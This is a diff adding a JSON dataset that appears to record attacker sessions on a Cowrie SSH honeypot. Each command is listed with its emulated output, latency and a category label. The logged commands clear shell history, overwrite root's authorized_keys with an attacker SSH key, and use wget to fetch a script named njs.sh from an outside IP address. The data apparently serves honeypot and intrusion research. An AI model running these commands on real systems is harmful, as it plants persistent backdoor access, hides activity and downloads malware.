@@ -1,0 +1,782 @@
+[
+  {
+    "index": 1,
+    "session_id": "6c70d195",
+    "cmd": "uname -a",
+    "cowrie_output": "\u001b[4lLinux svr04 3.2.0-4-amd64 #1 SMP Debian 3.2.68-1+deb7u1 x86_64 GNU/Linux",
+    "latency_ms": 8075.56,
+    "fi": 0,
+    "fi_label": "Read/Display",
+    "skipped": false
+  },
+  {
+    "index": 2,
+    "session_id": "6c70d195",
+    "cmd": "unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH",
+    "cowrie_output": "",
+    "latency_ms": 8075.03,
+    "fi": 0,
+    "fi_label": "Read/Display",
+    "skipped": false
+  },
+  {
+    "index": 3,
+    "session_id": "6c70d195",
+    "cmd": "history -n",
+    "cowrie_output": "\u001b[4l    1  uname -a\n2  unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH\n3  history -n",
+    "latency_ms": 8075.32,
+    "fi": 0,
+    "fi_label": "Read/Display",
+    "skipped": false
+  },
+  {
+    "index": 4,
+    "session_id": "6c70d195",
+    "cmd": "export HISTFILE=/dev/null",
+    "cowrie_output": "",
+    "latency_ms": 8074.62,
+    "fi": 0,
+    "fi_label": "Read/Display",
+    "skipped": false
+  },
+  {
+    "index": 5,
+    "session_id": "6c70d195",
+    "cmd": "export HISTSIZE=0",
+    "cowrie_output": "",
+    "latency_ms": 8075.4,
+    "fi": 0,
+    "fi_label": "Read/Display",
+    "skipped": false
+  },
+  {
+    "index": 6,
+    "session_id": "6c70d195",
+    "cmd": "export HISTFILESIZE=0",
+    "cowrie_output": "",
+    "latency_ms": 8074.93,
+    "fi": 0,
+    "fi_label": "Read/Display",
+    "skipped": false
+  },
+  {
+    "index": 7,
+    "session_id": "6c70d195",
+    "cmd": "cd",
+    "cowrie_output": "",
+    "latency_ms": 8074.86,
+    "fi": 0,
+    "fi_label": "Read/Display",
+    "skipped": false
+  },
+  {
+    "index": 8,
+    "session_id": "6c70d195",
+    "cmd": "mkdir /root/.ssh",
+    "cowrie_output": "\u001b[4lmkdir: cannot create directory `/root/.ssh': File exists",
+    "latency_ms": 8074.62,
+    "fi": 1,
+    "fi_label": "Create/Install",
+    "skipped": false
+  },
+  {
+    "index": 9,
+    "session_id": "6c70d195",
+    "cmd": "rm -rf .ssh/authorized_keys",
+    "cowrie_output": "",
+    "latency_ms": 8074.84,
+    "fi": 4,
+    "fi_label": "Impact/Delete/Passwd",
+    "skipped": false
+  },
+  {
+    "index": 10,
+    "session_id": "6c70d195",
+    "cmd": "touch .ssh/authorized_keys",
+    "cowrie_output": "",
+    "latency_ms": 8074.97,
+    "fi": 1,
+    "fi_label": "Create/Install",
+    "skipped": false
+  },
+  {
+    "index": 11,
+    "session_id": "6c70d195",
+    "cmd": "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAvN5GkpS25Z9eA2bARaXTVfVN2m/N5V5ddOTyVPftA3ljorQitmh1pyuZDty9oTWF+J0cOtGBvRaQ7NvZCaDC2q6QR0iMOfq7zs+4bl8WO8UnaQcVVIBeEt3YPo8PXwVm5fR4wgoq9SZp29/2jFz0UmAOhiUyImh9/P7jFWqpv3gSxZ8neq+4pSCUfE24OGiFBpJGkAE+wMmJcBX0WjFfjedcbBs1FO/C+x8WY9bFkQ3NwwjVbh3c3mYy9zqdPhm6GI/heVAZUWSKHausOwb+Rem+eKhkrKvoeteqJXEIrlLbHyRHn+12nN/qgG5kIcICv4TRD59GHMYZH3ILngyFJQ==' >> /root/.ssh/authorized_keys",
+    "cowrie_output": "",
+    "latency_ms": 8074.96,
+    "fi": 2,
+    "fi_label": "Modify/Navigate",
+    "skipped": false
+  },
+  {
+    "index": 12,
+    "session_id": "6c70d195",
+    "cmd": "cd",
+    "cowrie_output": "",
+    "latency_ms": 8074.06,
+    "fi": 0,
+    "fi_label": "Read/Display",
+    "skipped": false
+  },
+  {
+    "index": 1,
+    "session_id": "12398a44",
+    "cmd": "uname -a",
+    "cowrie_output": "\u001b[4lLinux svr04 3.2.0-4-amd64 #1 SMP Debian 3.2.68-1+deb7u1 x86_64 GNU/Linux",
+    "latency_ms": 8074.83,
+    "fi": 0,
+    "fi_label": "Read/Display",
+    "skipped": false
+  },
+  {
+    "index": 2,
+    "session_id": "12398a44",
+    "cmd": "unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH",
+    "cowrie_output": "",
+    "latency_ms": 8074.47,
+    "fi": 0,
+    "fi_label": "Read/Display",
+    "skipped": false
+  },
+  {
+    "index": 3,
+    "session_id": "12398a44",
+    "cmd": "history -n",
+    "cowrie_output": "\u001b[4l    1  uname -a\n2  unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH\n3  history -n\n4  export HISTFILE=/dev/null\n5  export HISTSIZE=0\n6  export HISTFILESIZE=0\n7  cd\n8  mkdir /root/.ssh\n9  rm -rf .ssh/authorized_keys\n10  touch .ssh/authorized_keys\n11  echo 'ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAvN5GkpS25Z9eA2bARaXTVfVN2m/N5V5ddOTyVPftA3ljorQitmh1pyuZDty9oTWF+J0cOtGBvRaQ7NvZCaDC2q6QR0iMOfq7zs+4bl8WO8UnaQcVVIBeEt3YPo8PXwVm5fR4wgoq9SZp29/2jFz0UmAOhiUyImh9/P7jFWqpv3gSxZ8neq+4pSCUfE24OGiFBpJGkAE+wMmJcBX0WjFfjedcbBs1FO/C+x8WY9bFkQ3NwwjVbh3c3mYy9zqdPhm6GI/heVAZUWSKHausOwb+Rem+eKhkrKvoeteqJXEIrlLbHyRHn+12nN/qgG5kIcICv4TRD59GHMYZH3ILngyFJQ==' >> /root/.ssh/authorized_keys\n12  cd\n13  uname -a\n14  unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH\n15  history -n",
+    "latency_ms": 8075.1,
+    "fi": 0,
+    "fi_label": "Read/Display",
+    "skipped": false
+  },
+  {
+    "index": 4,
+    "session_id": "12398a44",
+    "cmd": "export HISTFILE=/dev/null",
+    "cowrie_output": "",
+    "latency_ms": 8074.43,
+    "fi": 0,
+    "fi_label": "Read/Display",
+    "skipped": false
+  },
+  {
+    "index": 5,
+    "session_id": "12398a44",
+    "cmd": "export HISTSIZE=0",
+    "cowrie_output": "",
+    "latency_ms": 8074.69,
+    "fi": 0,
+    "fi_label": "Read/Display",
+    "skipped": false
+  },
+  {
+    "index": 6,
+    "session_id": "12398a44",
+    "cmd": "export HISTFILESIZE=0",
+    "cowrie_output": "",
+    "latency_ms": 8074.71,
+    "fi": 0,
+    "fi_label": "Read/Display",
+    "skipped": false
+  },
+  {
+    "index": 7,
+    "session_id": "12398a44",
+    "cmd": "cd",
+    "cowrie_output": "",
+    "latency_ms": 8074.78,
+    "fi": 0,
+    "fi_label": "Read/Display",
+    "skipped": false
+  },
+  {
+    "index": 8,
+    "session_id": "12398a44",
+    "cmd": "mkdir /root/.ssh",
+    "cowrie_output": "\u001b[4lmkdir: cannot create directory `/root/.ssh': File exists",
+    "latency_ms": 8074.05,
+    "fi": 1,
+    "fi_label": "Create/Install",
+    "skipped": false
+  },
+  {
+    "index": 9,
+    "session_id": "12398a44",
+    "cmd": "rm -rf .ssh/authorized_keys",
+    "cowrie_output": "",
+    "latency_ms": 8074.61,
+    "fi": 4,
+    "fi_label": "Impact/Delete/Passwd",
+    "skipped": false
+  },
+  {
+    "index": 10,
+    "session_id": "12398a44",
+    "cmd": "touch .ssh/authorized_keys",
+    "cowrie_output": "",
+    "latency_ms": 8075.13,
+    "fi": 1,
+    "fi_label": "Create/Install",
+    "skipped": false
+  },
+  {
+    "index": 11,
+    "session_id": "12398a44",
+    "cmd": "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAvN5GkpS25Z9eA2bARaXTVfVN2m/N5V5ddOTyVPftA3ljorQitmh1pyuZDty9oTWF+J0cOtGBvRaQ7NvZCaDC2q6QR0iMOfq7zs+4bl8WO8UnaQcVVIBeEt3YPo8PXwVm5fR4wgoq9SZp29/2jFz0UmAOhiUyImh9/P7jFWqpv3gSxZ8neq+4pSCUfE24OGiFBpJGkAE+wMmJcBX0WjFfjedcbBs1FO/C+x8WY9bFkQ3NwwjVbh3c3mYy9zqdPhm6GI/heVAZUWSKHausOwb+Rem+eKhkrKvoeteqJXEIrlLbHyRHn+12nN/qgG5kIcICv4TRD59GHMYZH3ILngyFJQ==' >> /root/.ssh/authorized_keys",
+    "cowrie_output": "",
+    "latency_ms": 8074.84,
+    "fi": 2,
+    "fi_label": "Modify/Navigate",
+    "skipped": false
+  },
+  {
+    "index": 12,
+    "session_id": "12398a44",
+    "cmd": "cd",
+    "cowrie_output": "",
+    "latency_ms": 8074.77,
+    "fi": 0,
+    "fi_label": "Read/Display",
+    "skipped": false
+  },
+  {
+    "index": 1,
+    "session_id": "c9c931b2",
+    "cmd": "uname -a",
+    "cowrie_output": "\u001b[4lLinux svr04 3.2.0-4-amd64 #1 SMP Debian 3.2.68-1+deb7u1 x86_64 GNU/Linux",
+    "latency_ms": 8074.5,
+    "fi": 0,
+    "fi_label": "Read/Display",
+    "skipped": false
+  },
+  {
+    "index": 2,
+    "session_id": "c9c931b2",
+    "cmd": "unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH",
+    "cowrie_output": "",
+    "latency_ms": 8074.48,
+    "fi": 0,
+    "fi_label": "Read/Display",
+    "skipped": false
+  },
+  {
+    "index": 3,
+    "session_id": "c9c931b2",
+    "cmd": "history -n",
+    "cowrie_output": "\u001b[4l    1  uname -a\n2  unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH\n3  history -n\n4  export HISTFILE=/dev/null\n5  export HISTSIZE=0\n6  export HISTFILESIZE=0\n7  cd\n8  mkdir /root/.ssh\n9  rm -rf .ssh/authorized_keys\n10  touch .ssh/authorized_keys\n11  echo 'ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAvN5GkpS25Z9eA2bARaXTVfVN2m/N5V5ddOTyVPftA3ljorQitmh1pyuZDty9oTWF+J0cOtGBvRaQ7NvZCaDC2q6QR0iMOfq7zs+4bl8WO8UnaQcVVIBeEt3YPo8PXwVm5fR4wgoq9SZp29/2jFz0UmAOhiUyImh9/P7jFWqpv3gSxZ8neq+4pSCUfE24OGiFBpJGkAE+wMmJcBX0WjFfjedcbBs1FO/C+x8WY9bFkQ3NwwjVbh3c3mYy9zqdPhm6GI/heVAZUWSKHausOwb+Rem+eKhkrKvoeteqJXEIrlLbHyRHn+12nN/qgG5kIcICv4TRD59GHMYZH3ILngyFJQ==' >> /root/.ssh/authorized_keys\n12  cd\n13  uname -a\n14  unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH\n15  history -n\n16  export HISTFILE=/dev/null\n17  export HISTSIZE=0\n18  export HISTFILESIZE=0\n19  cd\n20  mkdir /root/.ssh\n21  rm -rf .ssh/authorized_keys\n22  touch .ssh/authorized_keys\n23  echo 'ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAvN5GkpS25Z9eA2bARaXTVfVN2m/N5V5ddOTyVPftA3ljorQitmh1pyuZDty9oTWF+J0cOtGBvRaQ7NvZCaDC2q6QR0iMOfq7zs+4bl8WO8UnaQcVVIBeEt3YPo8PXwVm5fR4wgoq9SZp29/2jFz0UmAOhiUyImh9/P7jFWqpv3gSxZ8neq+4pSCUfE24OGiFBpJGkAE+wMmJcBX0WjFfjedcbBs1FO/C+x8WY9bFkQ3NwwjVbh3c3mYy9zqdPhm6GI/heVAZUWSKHausOwb+Rem+eKhkrKvoeteqJXEIrlLbHyRHn+12nN/qgG5kIcICv4TRD59GHMYZH3ILngyFJQ==' >> /root/.ssh/authorized_keys\n24  cd\n25  uname -a\n26  unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH\n27  history -n",
+    "latency_ms": 8075.02,
+    "fi": 0,
+    "fi_label": "Read/Display",
+    "skipped": false
+  },
+  {
+    "index": 4,
+    "session_id": "c9c931b2",
+    "cmd": "export HISTFILE=/dev/null",
+    "cowrie_output": "",
+    "latency_ms": 8074.89,
+    "fi": 0,
+    "fi_label": "Read/Display",
+    "skipped": false
+  },
+  {
+    "index": 5,
+    "session_id": "c9c931b2",
+    "cmd": "export HISTSIZE=0",
+    "cowrie_output": "",
+    "latency_ms": 8075.06,
+    "fi": 0,
+    "fi_label": "Read/Display",
+    "skipped": false
+  },
+  {
+    "index": 6,
+    "session_id": "c9c931b2",
+    "cmd": "export HISTFILESIZE=0",
+    "cowrie_output": "",
+    "latency_ms": 8074.66,
+    "fi": 0,
+    "fi_label": "Read/Display",
+    "skipped": false
+  },
+  {
+    "index": 7,
+    "session_id": "c9c931b2",
+    "cmd": "cd",
+    "cowrie_output": "",
+    "latency_ms": 8075.18,
+    "fi": 0,
+    "fi_label": "Read/Display",
+    "skipped": false
+  },
+  {
+    "index": 8,
+    "session_id": "c9c931b2",
+    "cmd": "mkdir /root/.ssh",
+    "cowrie_output": "\u001b[4lmkdir: cannot create directory `/root/.ssh': File exists",
+    "latency_ms": 8074.78,
+    "fi": 1,
+    "fi_label": "Create/Install",
+    "skipped": false
+  },
+  {
+    "index": 9,
+    "session_id": "c9c931b2",
+    "cmd": "rm -rf .ssh/authorized_keys",
+    "cowrie_output": "",
+    "latency_ms": 8074.28,
+    "fi": 4,
+    "fi_label": "Impact/Delete/Passwd",
+    "skipped": false
+  },
+  {
+    "index": 10,
+    "session_id": "c9c931b2",
+    "cmd": "touch .ssh/authorized_keys",
+    "cowrie_output": "",
+    "latency_ms": 8074.68,
+    "fi": 1,
+    "fi_label": "Create/Install",
+    "skipped": false
+  },
+  {
+    "index": 11,
+    "session_id": "c9c931b2",
+    "cmd": "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAvN5GkpS25Z9eA2bARaXTVfVN2m/N5V5ddOTyVPftA3ljorQitmh1pyuZDty9oTWF+J0cOtGBvRaQ7NvZCaDC2q6QR0iMOfq7zs+4bl8WO8UnaQcVVIBeEt3YPo8PXwVm5fR4wgoq9SZp29/2jFz0UmAOhiUyImh9/P7jFWqpv3gSxZ8neq+4pSCUfE24OGiFBpJGkAE+wMmJcBX0WjFfjedcbBs1FO/C+x8WY9bFkQ3NwwjVbh3c3mYy9zqdPhm6GI/heVAZUWSKHausOwb+Rem+eKhkrKvoeteqJXEIrlLbHyRHn+12nN/qgG5kIcICv4TRD59GHMYZH3ILngyFJQ==' >> /root/.ssh/authorized_keys",
+    "cowrie_output": "",
+    "latency_ms": 8075.15,
+    "fi": 2,
+    "fi_label": "Modify/Navigate",
+    "skipped": false
+  },
+  {
+    "index": 12,
+    "session_id": "c9c931b2",
+    "cmd": "cd",
+    "cowrie_output": "CONNECTION_RESET",
+    "latency_ms": null,
+    "fi": 0,
+    "fi_label": "Read/Display",
+    "skipped": false
+  },
+  {
+    "index": 1,
+    "session_id": "7341474f",
+    "cmd": "cd /tmp",
+    "cowrie_output": "",
+    "latency_ms": 8074.98,
+    "fi": 2,
+    "fi_label": "Modify/Navigate",
+    "skipped": false
+  },
+  {
+    "index": 2,
+    "session_id": "7341474f",
+    "cmd": "cd /var/run",
+    "cowrie_output": "",
+    "latency_ms": 8074.75,
+    "fi": 2,
+    "fi_label": "Modify/Navigate",
+    "skipped": false
+  },
+  {
+    "index": 3,
+    "session_id": "7341474f",
+    "cmd": "cd /mnt",
+    "cowrie_output": "",
+    "latency_ms": 8074.73,
+    "fi": 2,
+    "fi_label": "Modify/Navigate",
+    "skipped": false
+  },
+  {
+    "index": 4,
+    "session_id": "7341474f",
+    "cmd": "cd /root",
+    "cowrie_output": "",
+    "latency_ms": 8074.78,
+    "fi": 2,
+    "fi_label": "Modify/Navigate",
+    "skipped": false
+  },
+  {
+    "index": 5,
+    "session_id": "7341474f",
+    "cmd": "cd /",
+    "cowrie_output": "",
+    "latency_ms": 8074.79,
+    "fi": 2,
+    "fi_label": "Modify/Navigate",
+    "skipped": false
+  },
+  {
+    "index": 6,
+    "session_id": "7341474f",
+    "cmd": "wget http://102.165.48.81/njs.sh",
+    "cowrie_output": "\u001b[4l--2026-04-18 10:23:54--  http://102.165.48.81/njs.sh\nConnecting to 102.165.48.81:80... connected.\nHTTP request sent, awaiting response...",
+    "latency_ms": 25076.22,
+    "fi": 1,
+    "fi_label": "Create/Install",
+    "skipped": false
+  },
+  {
+    "index": 1,
+    "session_id": "da2097ac",
+    "cmd": "cd /tmp",
+    "cowrie_output": "",
+    "latency_ms": 8074.84,
+    "fi": 2,
+    "fi_label": "Modify/Navigate",
+    "skipped": false
+  },
+  {
+    "index": 2,
+    "session_id": "da2097ac",
+    "cmd": "cd /var/run",
+    "cowrie_output": "",
+    "latency_ms": 8074.76,
+    "fi": 2,
+    "fi_label": "Modify/Navigate",
+    "skipped": false
+  },
+  {
+    "index": 3,
+    "session_id": "da2097ac",
+    "cmd": "cd /mnt",
+    "cowrie_output": "",
+    "latency_ms": 8074.68,
+    "fi": 2,
+    "fi_label": "Modify/Navigate",
+    "skipped": false
+  },
+  {
+    "index": 4,
+    "session_id": "da2097ac",
+    "cmd": "cd /root",
+    "cowrie_output": "",
+    "latency_ms": 8074.92,
+    "fi": 2,
+    "fi_label": "Modify/Navigate",
+    "skipped": false
+  },
+  {
+    "index": 5,
+    "session_id": "da2097ac",
+    "cmd": "cd /",
+    "cowrie_output": "",
+    "latency_ms": 8075.04,
+    "fi": 2,
+    "fi_label": "Modify/Navigate",
+    "skipped": false
+  },
+  {
+    "index": 6,
+    "session_id": "da2097ac",
+    "cmd": "wget http://102.165.48.81/njs.sh",
+    "cowrie_output": "",
+    "latency_ms": 25076.1,
+    "fi": 1,
+    "fi_label": "Create/Install",
+    "skipped": false
+  },
+  {
+    "index": 1,
+    "session_id": "1444ff39",
+    "cmd": "cd /tmp",
+    "cowrie_output": "",
+    "latency_ms": 8074.28,
+    "fi": 2,
+    "fi_label": "Modify/Navigate",
+    "skipped": false
+  },
+  {
+    "index": 2,
+    "session_id": "1444ff39",
+    "cmd": "cd /var/run",
+    "cowrie_output": "",
+    "latency_ms": 8074.37,
+    "fi": 2,
+    "fi_label": "Modify/Navigate",
+    "skipped": false
+  },
+  {
+    "index": 3,
+    "session_id": "1444ff39",
+    "cmd": "cd /mnt",
+    "cowrie_output": "",
+    "latency_ms": 8074.15,
+    "fi": 2,
+    "fi_label": "Modify/Navigate",
+    "skipped": false
+  },
+  {
+    "index": 4,
+    "session_id": "1444ff39",
+    "cmd": "cd /root",
+    "cowrie_output": "",
+    "latency_ms": 8075.17,
+    "fi": 2,
+    "fi_label": "Modify/Navigate",
+    "skipped": false
+  },
+  {
+    "index": 5,
+    "session_id": "1444ff39",
+    "cmd": "cd /",
+    "cowrie_output": "",
+    "latency_ms": 8074.58,
+    "fi": 2,
+    "fi_label": "Modify/Navigate",
+    "skipped": false
+  },
+  {
+    "index": 6,
+    "session_id": "1444ff39",
+    "cmd": "wget http://102.165.48.81/njs.sh",
+    "cowrie_output": "",
+    "latency_ms": 25076.67,
+    "fi": 1,
+    "fi_label": "Create/Install",
+    "skipped": false
+  },
+  {
+    "index": 1,
+    "session_id": "e9a73283",
+    "cmd": "cd /tmp",
+    "cowrie_output": "",
+    "latency_ms": 8074.49,
+    "fi": 2,
+    "fi_label": "Modify/Navigate",
+    "skipped": false
+  },
+  {
+    "index": 2,
+    "session_id": "e9a73283",
+    "cmd": "cd /var/run",
+    "cowrie_output": "",
+    "latency_ms": 8074.95,
+    "fi": 2,
+    "fi_label": "Modify/Navigate",
+    "skipped": false
+  },
+  {
+    "index": 3,
+    "session_id": "e9a73283",
+    "cmd": "cd /mnt",
+    "cowrie_output": "",
+    "latency_ms": 8074.24,
+    "fi": 2,
+    "fi_label": "Modify/Navigate",
+    "skipped": false
+  },
+  {
+    "index": 4,
+    "session_id": "e9a73283",
+    "cmd": "cd /root",
+    "cowrie_output": "",
+    "latency_ms": 8074.97,
+    "fi": 2,
+    "fi_label": "Modify/Navigate",
+    "skipped": false
+  },
+  {
+    "index": 5,
+    "session_id": "e9a73283",
+    "cmd": "cd /",
+    "cowrie_output": "",
+    "latency_ms": 8074.47,
+    "fi": 2,
+    "fi_label": "Modify/Navigate",
+    "skipped": false
+  },
+  {
+    "index": 6,
+    "session_id": "e9a73283",
+    "cmd": "wget http://102.165.48.81/njs.sh",
+    "cowrie_output": "",
+    "latency_ms": 25075.41,
+    "fi": 1,
+    "fi_label": "Create/Install",
+    "skipped": false
+  },
+  {
+    "index": 1,
+    "session_id": "5a14d21b",
+    "cmd": "cd /tmp",
+    "cowrie_output": "",
+    "latency_ms": 8074.9,
+    "fi": 2,
+    "fi_label": "Modify/Navigate",
+    "skipped": false
+  },
+  {
+    "index": 2,
+    "session_id": "5a14d21b",
+    "cmd": "cd /var/run",
+    "cowrie_output": "",
+    "latency_ms": 8074.67,
+    "fi": 2,
+    "fi_label": "Modify/Navigate",
+    "skipped": false
+  },
+  {
+    "index": 3,
+    "session_id": "5a14d21b",
+    "cmd": "cd /mnt",
+    "cowrie_output": "",
+    "latency_ms": 8074.12,
+    "fi": 2,
+    "fi_label": "Modify/Navigate",
+    "skipped": false
+  },
+  {
+    "index": 4,
+    "session_id": "5a14d21b",
+    "cmd": "cd /root",
+    "cowrie_output": "CONNECTION_RESET",
+    "latency_ms": null,
+    "fi": 2,
+    "fi_label": "Modify/Navigate",
+    "skipped": false
+  },
+  {
+    "index": 5,
+    "session_id": "5a14d21b",
+    "cmd": "cd /",
+    "cowrie_output": "",
+    "latency_ms": 8074.8,
+    "fi": 2,
+    "fi_label": "Modify/Navigate",
+    "skipped": false
+  },
+  {
+    "index": 6,
+    "session_id": "5a14d21b",
+    "cmd": "wget http://102.165.48.81/njs.sh",
+    "cowrie_output": "\u001b[4l--2026-04-18 10:28:21--  http://102.165.48.81/njs.sh\nConnecting to 102.165.48.81:80... connected.\nHTTP request sent, awaiting response...",
+    "latency_ms": 25076.92,
+    "fi": 1,
+    "fi_label": "Create/Install",
+    "skipped": false
+  },
+  {
+    "index": 1,
+    "session_id": "7c59fc0e",
+    "cmd": "cd /tmp",
+    "cowrie_output": "",
+    "latency_ms": 8073.19,
+    "fi": 2,
+    "fi_label": "Modify/Navigate",
+    "skipped": false
+  },
+  {
+    "index": 2,
+    "session_id": "7c59fc0e",
+    "cmd": "cd /var/run",
+    "cowrie_output": "",
+    "latency_ms": 8073.91,
+    "fi": 2,
+    "fi_label": "Modify/Navigate",
+    "skipped": false
+  },
+  {
+    "index": 3,
+    "session_id": "7c59fc0e",
+    "cmd": "cd /mnt",
+    "cowrie_output": "",
+    "latency_ms": 8073.8,
+    "fi": 2,
+    "fi_label": "Modify/Navigate",
+    "skipped": false
+  },
+  {
+    "index": 4,
+    "session_id": "7c59fc0e",
+    "cmd": "cd /root",
+    "cowrie_output": "",
+    "latency_ms": 8073.88,
+    "fi": 2,
+    "fi_label": "Modify/Navigate",
+    "skipped": false
+  },
+  {
+    "index": 5,
+    "session_id": "7c59fc0e",
+    "cmd": "cd /",
+    "cowrie_output": "",
+    "latency_ms": 8074.0,
+    "fi": 2,
+    "fi_label": "Modify/Navigate",
+    "skipped": false
+  },
+  {
+    "index": 6,
+    "session_id": "7c59fc0e",
+    "cmd": "wget http://102.165.48.81/njs.sh",
+    "cowrie_output": "",
+    "latency_ms": 25075.38,
+    "fi": 1,
+    "fi_label": "Create/Install",
+    "skipped": false
+  },
+  {
+    "index": 1,
+    "session_id": "d3abe7e9",
+    "cmd": "cd /tmp",
+    "cowrie_output": "",
+    "latency_ms": 8073.92,
+    "fi": 2,
+    "fi_label": "Modify/Navigate",
+    "skipped": false
+  },
+  {
+    "index": 2,
+    "session_id": "d3abe7e9",
+    "cmd": "cd /var/run",
+    "cowrie_output": "",
+    "latency_ms": 8074.11,
+    "fi": 2,
+    "fi_label": "Modify/Navigate",
+    "skipped": false
+  },
+  {
+    "index": 3,
+    "session_id": "d3abe7e9",
+    "cmd": "cd /mnt",
+    "cowrie_output": "",
+    "latency_ms": 8074.34,
+    "fi": 2,
+    "fi_label": "Modify/Navigate",
+    "skipped": false
+  },
+  {
+    "index": 4,
+    "session_id": "d3abe7e9",
+    "cmd": "cd /root",
+    "cowrie_output": "",
+    "latency_ms": 8073.96,
+    "fi": 2,
+    "fi_label": "Modify/Navigate",
+    "skipped": false
+  },
+  {
+    "index": 5,
+    "session_id": "d3abe7e9",
+    "cmd": "cd /",
+    "cowrie_output": "",
+    "latency_ms": 8073.64,
+    "fi": 2,
+    "fi_label": "Modify/Navigate",
+    "skipped": false
+  },
+  {
+    "index": 6,
+    "session_id": "d3abe7e9",
+    "cmd": "wget http://102.165.48.81/njs.sh",
+    "cowrie_output": "",
+    "latency_ms": 25074.54,
+    "fi": 1,
+    "fi_label": "Create/Install",
+    "skipped": false
+  }
+]
